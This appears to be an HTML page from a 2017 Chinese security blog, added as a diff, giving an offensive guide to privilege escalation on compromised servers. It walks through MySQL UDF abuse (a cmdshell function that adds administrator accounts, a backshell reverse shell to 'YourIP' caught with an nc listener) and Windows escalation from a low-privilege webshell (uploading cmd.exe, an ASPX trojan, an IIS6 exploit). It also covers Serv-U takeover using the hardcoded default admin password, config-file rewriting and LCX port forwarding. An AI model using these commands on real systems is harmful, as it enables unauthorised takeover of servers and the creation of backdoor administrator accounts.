@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      提权思路 | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="0x01 mysql提权0x01 UDF提权1、利用UDF提权udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权思路 | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2017/03/07/提权思路/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="0x01 mysql提权0x01 UDF提权1、利用UDF提权udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权">
+<meta property="og:image" content="http://p1.bpimg.com/567571/13147d28fa2fb8a3.jpg">
+<meta property="og:image" content="http://p1.bqimg.com/567571/5ffe413926ff6008.jpg">
+<meta property="og:image" content="http://p1.bqimg.com/567571/d89407b44f300b55.jpg">
+<meta property="og:image" content="http://i1.piimg.com/567571/aa0d12c24672e23f.jpg">
+<meta property="og:image" content="http://i1.piimg.com/567571/113718d1496a9569.jpg">
+<meta property="og:image" content="http://i1.piimg.com/567571/7579dd7491853a30.jpg">
+<meta property="og:image" content="http://p1.bpimg.com/567571/a2fdef79c17c6a60.jpg">
+<meta property="og:image" content="http://p1.bqimg.com/567571/e4a178638e6ba70d.jpg">
+<meta property="og:image" content="http://p1.bqimg.com/567571/0f75bb881053f077.jpg">
+<meta property="og:image" content="http://i1.piimg.com/567571/437f6d2666181f4c.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/d95060265749733f.png">
+<meta property="og:updated_time" content="2017-03-07T14:55:29.597Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="提权思路 | Hello,C">
+<meta name="twitter:description" content="0x01 mysql提权0x01 UDF提权1、利用UDF提权udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权">
+<meta name="twitter:image" content="http://p1.bpimg.com/567571/13147d28fa2fb8a3.jpg">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">提权思路</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-03-07" class="post-meta__date date">2017-03-07</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/提权/">提权</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="0x01-mysql提权"><a href="#0x01-mysql提权" class="headerlink" title="0x01 mysql提权"></a>0x01 mysql提权</h3><h4 id="0x01-UDF提权"><a href="#0x01-UDF提权" class="headerlink" title="0x01 UDF提权"></a>0x01 UDF提权</h4><p>1、利用UDF提权<br>udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。<a id="more"></a></p>
+<p><strong>适用场合：</strong><br>1、目标主机系统是Windows（Win2000、XP、Win2003）。<br>2、拥有该主机mysql中的某个用户账号，该账号需要有对mysql的insert和delete权限。</p>
+<p><strong>使用方法：</strong><br>1、获取当前mysql的一个账号，一般情况下在网站的config.php文件就能找到（具体在哪个文件每个CMS都不一样）。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。mysql<5.0，导出路径随意；5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“no paths="" allowed="" for="" shared="" library”错误；mysql="">5.1，需要使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%plugin%&apos;;</div></pre></td></tr></table></figure></5.0，导出路径随意；5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“no></p>
+<p>语句查看插件安装路径，导出的时候指定DLL路径为插件路径。<br>回显如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like &apos;%plugin%&apos;;</div><div class="line">+---------------+------------------------------------------+</div><div class="line">| Variable_name | Value                                    |</div><div class="line">+---------------+------------------------------------------+</div><div class="line">| plugin_dir    | E:\wamp\bin\mysql\mysql5.5.20\lib/plugin |</div><div class="line">+---------------+------------------------------------------+</div></pre></td></tr></table></figure></p>
+<p>4、使用SQL语句创建自定义函数。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Create Function 函数名 returns string soname &apos;导出的DLL路径&apos;;</div><div class="line">// eg:Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div></pre></td></tr></table></figure></p>
+<p>常用函数名：</p>
+<pre><code>cmdshell    执行cmd;
+downloader  下载者,到网上下载指定文件并保存到指定目录;
+open3389    通用开3389终端服务,可指定端口(不改端口无需重启);
+backshell   反弹Shell;
+ProcessView 枚举系统进程;
+KillProcess 终止指定进程;
+regread     读注册表;
+regwrite    写注册表;
+shut        关机,注销,重启;
+about       说明与帮助函数;
+</code></pre><p>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。<br>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">delete from mysql.func where name=&apos;cmdshell&apos;</div></pre></td></tr></table></figure></p>
+<p>5、创建函数成功后，就可以通过sql语句去调用它了。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select 创建的函数名 (&apos;参数列表&apos;);</div><div class="line">// eg:select cmdshell(&quot;net user hacker 12345 /add&quot;); 创建一个用户hacker，密码为12345</div></pre></td></tr></table></figure></p>
+<p> 6、函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。删除函数的语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">drop function 创建的函数名;</div><div class="line">// eg:drop function cmdshell;</div></pre></td></tr></table></figure></p>
+<p><strong>具体流程如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user waitalone waitalone.cn /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators waitalone /add&apos;);</div><div class="line">drop function cmdshell; 删除函数</div><div class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</div></pre></td></tr></table></figure></p>
+<p>注意：<br>1、导出的文件名不一定非是xxx.dll，可以是任意的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create function sys_eval returns string soname &apos;udf.xox&apos;;</div></pre></td></tr></table></figure></p>
+<p>2、提示错误 Can’t open shared library ‘fun.dll’ (errno: 2 )<br>除了udf不存在、udf被杀，还有可能是你的udf版本不对，你拿32位的udf去在64位系统注册的话，一样会提示错误。<br>3、某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，可以利用NTFS ADS流来创建文件夹的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select @@basedir;  //查找到mysql的目录</div><div class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;  //利用NTFS ADS创建lib目录</div><div class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS创建plugin目录</div></pre></td></tr></table></figure></p>
+<p>4、降权的mysql一样有用，能注册dll的话你一样能够执行命令，不过权限是根据mysql来的， 在不支持aspx，ws、shell.application被删得情况下还有一丝希望。</p>
+<h4 id="0x02-反弹端口连接提权"><a href="#0x02-反弹端口连接提权" class="headerlink" title="0x02 反弹端口连接提权"></a>0x02 反弹端口连接提权</h4><p>假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？<br>1、利用mysql客户端工具连接mysql服务器，然后执行下面的操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql.exe -h 172.16.10.11 -uroot -p</div><div class="line">Enter password:</div><div class="line">mysql&gt; \. c:\mysql.txt</div><div class="line">mysql&gt;select backshell(&quot;YourIP&quot;,2010);</div></pre></td></tr></table></figure></p>
+<p>2、本地监听你反弹的端口<br>nc.exe -vv -l -p 2010<br>成功后，将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。</p>
+<h3 id="0x02-Windows提权"><a href="#0x02-Windows提权" class="headerlink" title="0x02 Windows提权"></a>0x02 Windows提权</h3><p>操作系统漏洞提权<br>systeminfo<br>查看修补的补丁编号<br>PR               -pr.exe<br>巴西烤肉<br>IIS6溢出     -iis6.exe<br>LPK劫持     -lpk.dll</p>
+<p>当我们拿到一个低权限的webshell后，一般先探测服务器内部的信息，以找见可以提权的条件和桥梁。什么叫服务器的总体环境呢？例如：目标服务器开启的端口、进程、系统服务，安装了哪些程序，系统安全的大体设置。</p>
+<p><strong>为什么要获取服务器的这些总体信息呢？</strong><br>1、端口信息，可以让我们知道服务器开了哪些端口？哪些端口可以利用？哪些端口对应的服务或程序可以利用？或是对方还开了哪些我们不知道的服务（比如对方又开了一些不常用的端口来运行高权限的WEB服务，如tomcat等）。<br>比如，SERV-U修改了本地管理端口，我们也可以通过端口和进程信息进行了解。<br>2、进程信息，可以让我们知道服务器运行了哪些程序，管理员喜欢开什么程序，或正在运行什么程序。有哪些防护（比如杀毒软件，防火墙等信息）<br>3、系统服务信息，可以让我们了解，哪些服务是运行的，哪些服务可以利用。第三方服务的路径以及启动方式等信息。<br>如果第三方服务，是装在某些特殊目录，我们可以通过查询系统服务信息获得后，用CACLS命令查询其是否有权限进行修改或写入等操作。若可以写入，或修改，我们就可以替换或修改服务程序来达到提权的目的。<br>4、系统环境变量，也可以让我们获得一些信息，比如安装了哪些程序，哪些变量我们可以利用。<br>5、系统权限的设置的探测，我们可以通过一些疏漏的地方进行利用，以达到提权的目的。</p>
+<p>通过常规web渗透，已经拿到webshell。那么接下来作重要的就是探测系统信息，提权，针对windows想办法开启远程桌面连接，针对linux想办法使用反弹shell来本地连接。<br>Webshell应该都可以调用系统cmd执行一些简单的命令，那么whoami（查看当前权限），netuser（查看用户/组），systeminfo（查看系统补丁修复情况）等常见命令应该是首先被执行探测的。</p>
+<p>Windows常见提权思路：(前提已经getshell但是权限不大的前提下)<br>1、查看基本的信息<br><img src="http://p1.bpimg.com/567571/13147d28fa2fb8a3.jpg" alt=""><br>2、使用cmd执行命令<br>尝试使用cmd执行命令<br><img src="http://p1.bqimg.com/567571/5ffe413926ff6008.jpg" alt=""><br>找可写目录<br><img src="http://p1.bqimg.com/567571/d89407b44f300b55.jpg" alt=""><br>尝试上传cmd.exe<br><img src="http://i1.piimg.com/567571/aa0d12c24672e23f.jpg" alt=""><br>写一个ASPX马<br><img src="http://i1.piimg.com/567571/113718d1496a9569.jpg" alt=""><br>继续上传cmd.exe，并执行cmd命令<br><img src="http://i1.piimg.com/567571/7579dd7491853a30.jpg" alt=""><br>3、提升权限<br>查看未安装补丁<br><img src="http://p1.bpimg.com/567571/a2fdef79c17c6a60.jpg" alt=""><br>上传exp（iss6.exe）提权<br><img src="http://p1.bqimg.com/567571/e4a178638e6ba70d.jpg" alt=""><br><img src="http://p1.bqimg.com/567571/0f75bb881053f077.jpg" alt=""><br>4、添加用户<br>添加远程连接用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user hacker 123 /add </div><div class="line">net localgroup administrators hacker /add</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-Server-U提权"><a href="#0x03-Server-U提权" class="headerlink" title="0x03 Server-U提权"></a>0x03 Server-U提权</h3><p>Serv-U提权，属于一种漏洞，该漏洞是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令。<br>漏洞是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令，Serv-u&gt;3.x版本默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P，这是集成在Serv-u内部的，可以以Guest权限来进行连接，对Serv-u进行管理。</p>
+<p>serv-u提权主要分为serv-u6及以前版本、serv-u7以下版本的提权，serv-u7版本提权等</p>
+<p><strong>主要提权方法：</strong></p>
+<p>一、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
+<p>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下 比如是d盘<br>3、执行命令 d:\serv_u.exe<br>4、d:\serv_u.exe “net user username password /add” (注意命令要有引号)<br>5、d:\serv_u.exe “net localgroup administrators username /add” (注意命令要有引号)</p>
+<p>二、ServUDaemon.ini 文件重写后提权(对ServUDaemon.ini有写入的权限)</p>
+<p>先修改Domain来添加用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[Domain1]</div><div class="line">User2=spider|1|0</div></pre></td></tr></table></figure></p>
+<p>然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[USER=spiger|1]</div><div class="line">Password=sbd8b58b5c201ee5cc20f9a8551197d4a5</div><div class="line">HomeDir=c:\</div><div class="line">RelPaths=3</div><div class="line">TimeOut=600</div><div class="line">Maintenance=System</div><div class="line">Access1=C:\|RWAMELCDP</div><div class="line">Access2=d:\|RWAMELCDP</div><div class="line">Access3=e:\|RWAMELCDP</div><div class="line">SKEYValues=</div></pre></td></tr></table></figure></p>
+<p>添加上述代码并保存后，就会在serv-u中添加用户名为spiger，密码是123456。<br>通过在本地命令行执行ftp 目标IP地址  命令来连接目标FTP服务器。连接后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">quote site exec net user spiger 123456 /add</div><div class="line">quote site exec net localgroup administrators spiger /add</div></pre></td></tr></table></figure></p>
+<p>ps：上述添加的文件中最重要的是Maintenance=System这句，有了这句添加的FTP用户才是管理员用户，才会有命令执行权限（因为最后是通过FTFP执行命令来添加系统用户的）。</p>
+<p>三、serv-u配置文件无修改权限，但是可以看到配置文件，进行口令破解</p>
+<p>看到FTP用户的配置文件ServUDaemon.ini，在其中找到Maintenance=System的用户，该用户就是系统管理员。如果能够成功破解系统管理员的口令，就可以利用该管理员执行添加系统管理员的用户（类似方法二）。<br>serv-u配置文件中Password字段就是用户口令加密变换后的字符串，破解方法：去掉前两位，剩下的进行md5破解，破解后再去掉前两位，剩下的就是FTP用户口令。</p>
+<p>四、serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权（这是最常用的方法，一般大马中集成的serv-u提权方法就是本方法）</p>
+<p>serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。<br><img src="http://i1.piimg.com/567571/437f6d2666181f4c.png" alt=""><br>虽然，网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查看ServUAdmin.exe文件来获取管理账号和口令。方法如下：下载serv-u目录下的ServUAdmin.exe文件，在本地用文本文件打开，查找LocalAdministrator字符来获取口令位置：<br><img src="http://i1.piimg.com/567571/d95060265749733f.png" alt=""></p>
+<p>可以看到serv-u的管理账号和口令都在文件中，仔细查找即可（如果连用户名也修改了，就搜127.0.0.1或记住账号和密码在文件中的位置）。获取管理账号和口令后就可以利用大马自带的serv-u来进行提权了。</p>
+<p>五、serv-u ftp转发端口<br>我们可以利用端口转发的方式来将其管理端口转发的本地，进而提权。在目标Webshell上运行LCX：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -slave 你的IP 5000 127.0.0.1 43958</div></pre></td></tr></table></figure></p>
+<p>在本机上运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -listen 5000 21</div></pre></td></tr></table></figure></p>
+<p>打开本地的SERV_U 在IP上填入127.0.0.1 帐号写LocalAdministrator 密码#l@$ak#.lk;0@P此时的连接过程是：本机连接21端口——&gt;转发往本机5000端口——&gt;管道连接至远程机5000端口——&gt;转发至远程43958端口<br>连接成功后，在本机登陆Serv_U就相当于登陆了远程的Serv_U。你可以FTP登陆本机IP,输入上面的帐号和密码，在远程FTP服务器上执行命令。</p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2017/03/07/提权思路/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
